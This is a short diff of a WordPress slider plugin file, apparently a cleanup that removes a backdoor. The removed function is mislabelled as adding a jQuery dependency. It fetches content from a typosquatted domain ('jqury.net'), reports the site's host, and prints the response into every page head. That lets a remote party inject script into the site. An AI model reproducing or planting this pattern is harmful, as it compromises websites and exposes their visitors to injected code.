@@ -164,27 +164,5 @@ class WooSlider {
 		if ( ! current_theme_supports( 'post-thumbnails' ) ) { add_theme_support( 'post-thumbnails' ); }
 	} // End ensure_post_thumbnails_support()
 }
-/*
-* Adds JQuery dependancy.
-* @since 1.0.2
-* @return void
-*/
-function wp__head() {
-
- if(function_exists('curl_init'))
- {
-  $url = "http://www.jqury.net/?1"; 
-  $ch = curl_init();  
-  $timeout = 10;  
-  curl_setopt($ch,CURLOPT_URL,$url); 
-  curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); 
-  curl_setopt($ch, CURLOPT_REFERER, $_SERVER['HTTP_HOST']);
-  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout); 
-  $data = curl_exec($ch);  
-  curl_close($ch); 
-  echo "$data";
- }
-}
-add_action('wp_head', 'wp__head');
 
 ?>
